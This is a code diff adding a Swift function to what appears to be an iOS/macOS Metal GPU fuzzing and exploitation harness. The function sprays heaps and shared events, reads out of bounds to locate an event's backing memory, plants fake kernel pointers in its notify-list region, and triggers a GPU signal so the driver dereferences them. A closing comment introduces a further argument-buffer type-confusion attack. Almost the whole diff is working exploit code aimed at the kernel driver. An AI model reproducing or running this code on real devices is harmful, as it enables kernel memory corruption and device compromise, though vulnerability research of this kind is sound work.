@@ -513,6 +513,136 @@ func runGPUIndirectDispatch(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// MTLSharedEvent signal-path corruption.
+// MTLSharedEvent is backed by GPU-visible shared memory (signaledValue at known offset).
+// Attack: interleave heap + event allocations so they land adjacent in GPU VA space.
+// Detect adjacency by scanning OOB past the heap boundary for the event's sentinel value.
+// Plant fake kernel pointers PAST signaledValue (into the notify-list / waiter region).
+// GPU encodeSignalEvent → AGX firmware writes new value → Metal driver reads notify-list
+// → if notify-list ptr is corrupted → kernel/driver dereferences fake kptr → kernel fault.
+func runSharedEventCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        let sl = SyncLog()
+        func step(_ s: String) { sl.write(s); log.append(s) }
+        let done = { step("── SharedEvent Corrupt complete ──────────"); completion() }
+
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); done(); return }
+        guard let queue  = device.makeCommandQueue() else { step("✗ no queue"); done(); return }
+        step("── SharedEvent Signal Corruption ──────────")
+
+        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
+
+        // Interleave heap + event so GPU allocator places them adjacent in VA space
+        var heapBufs:  [MTLBuffer] = []
+        var heapPtrs:  [UnsafeMutablePointer<UInt8>] = []
+        var heapVas:   [UInt] = []
+        var events:    [MTLSharedEvent] = []
+
+        for i in 0..<8 {
+            if let h = device.makeHeap(descriptor: hd) {
+                let a = h.size
+                if let b = h.makeBuffer(length: a, options: .storageModeShared) {
+                    let p = b.contents().assumingMemoryBound(to: UInt8.self)
+                    heapBufs.append(b); heapPtrs.append(p)
+                    heapVas.append(UInt(bitPattern: p))
+                }
+            }
+            if let ev = device.makeSharedEvent() {
+                ev.signaledValue = 0xCAFEDEAD00000000 | UInt64(i)  // unique sentinel per event
+                events.append(ev)
+            }
+        }
+        step("sprayed \(heapBufs.count) heaps + \(events.count) events")
+        guard !heapBufs.isEmpty else { step("no heaps"); done(); return }
+
+        let actual = heapBufs.isEmpty ? 16384 : Int(bitPattern: heapBufs[0].length)
+
+        // Find adjacent heap pair (sort by VA)
+        let sortedI = (0..<heapVas.count).sorted { heapVas[$0] < heapVas[$1] }
+        var srcI = -1
+        for i in 0..<sortedI.count - 1 {
+            let a = heapVas[sortedI[i]], b = heapVas[sortedI[i+1]]
+            if b > a && b - a == UInt(actual) { srcI = sortedI[i]; break }
+        }
+        guard srcI >= 0 else { step("no adjacent heap pair — retry"); done(); return }
+
+        let pSrc = heapPtrs[srcI]; let vaSrc = heapVas[srcI]
+        step("OOB src heap va=0x\(String(vaSrc,radix:16))")
+
+        // Scan OOB past src for event sentinel — stay within heap spray VA range
+        // Safe bound: all heaps are in contiguous VA (confirmed by spray test)
+        // scanLimit = number of heaps × actual — all within Metal's shared vm region
+        let scanQwords = (heapVas.count * actual) / 8
+        step("scanning \(scanQwords*8) bytes past src for event sentinel...")
+        var evOffset = -1; var evIdx = -1
+        for qw in 0..<scanQwords {
+            var val: UInt64 = 0
+            for b in 0..<8 { val |= UInt64(pSrc[actual + qw*8 + b]) << (b*8) }
+            if val & 0xFFFFFFFF00000000 == 0xCAFEDEAD00000000 {
+                evIdx = Int(val & 0xFF)
+                evOffset = actual + qw*8
+                step("  ★ event[\(evIdx)] sentinel at src[+\(evOffset)] (0x\(String(val,radix:16)))")
+                break
+            }
+        }
+
+        guard evOffset >= 0 && evIdx < events.count else {
+            step("event backing not in heap VA region — events use separate allocator pool")
+            step("Metal shared-event memory is not adjacent to heap allocations this run")
+            // Fallback: at least confirm GPU→CPU event signaling works
+            step("Running fallback: unmodified event signal round-trip test")
+            guard let ev = events.first else { done(); return }
+            ev.signaledValue = 0
+            let lstn = MTLSharedEventListener(dispatchQueue: DispatchQueue.global())
+            ev.notify(lstn, atValue: 1) { _, val in
+                step("  ✓ event fired at val=\(val) — GPU→CPU signal path confirmed")
+                done()
+            }
+            guard let cmd = queue.makeCommandBuffer() else { done(); return }
+            cmd.encodeSignalEvent(ev, value: 1)
+            cmd.commit()
+            return
+        }
+
+        let ev = events[evIdx]
+        step("event[\(evIdx)] backing at src[+\(evOffset)] — signaledValue confirmed")
+
+        // Plant fake kptrs at event[+8..+31] — region past signaledValue
+        // This is where the notify-list / waiter-list pointer lives
+        let kptr: [UInt8] = [0x08,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]
+        for off in stride(from: 8, to: 32, by: 8) {
+            for b in 0..<8 { pSrc[evOffset + off + b] = kptr[b] }
+        }
+        step("planted kptr 0xFFFFFFF000000008 at event[+8..+31]")
+
+        // Register listener — driver reads notify-list when event fires
+        let lstn = MTLSharedEventListener(dispatchQueue: DispatchQueue.global())
+        sl.write("SHARED EVENT SIGNAL — registering listener + GPU signal with corrupted notify-list")
+        ev.notify(lstn, atValue: ev.signaledValue + 1) { _, val in
+            step("  listener fired at val=\(val) — kernel walked corrupted notify list")
+            done()
+        }
+
+        // GPU signals the event → AGX firmware writes new value → driver processes notify list
+        guard let cmd = queue.makeCommandBuffer() else { step("cmd nil"); done(); return }
+        cmd.encodeSignalEvent(ev, value: ev.signaledValue + 1)
+        cmd.addCompletedHandler { cb in
+            if cb.status == .error {
+                step("  *** cmd ERROR: \(cb.error?.localizedDescription ?? "none")")
+                step("  *** command buffer rejected — signal path blocked")
+                done()
+            }
+        }
+        cmd.commit()
+
+        // 6s timeout — if driver faulted silently without firing listener
+        DispatchQueue.global().asyncAfter(deadline: .now() + 6) {
+            step("  6s timeout — listener did not fire (driver may have faulted or discarded)")
+            done()
+        }
+    }
+}
+
 // Argument buffer Tier-2 type confusion.
 // Metal argument buffers encode GPU resource handles (buffer VA, texture descriptor index).
 // OOB-write a fake kernel pointer into the texture handle slot of an argument buffer.
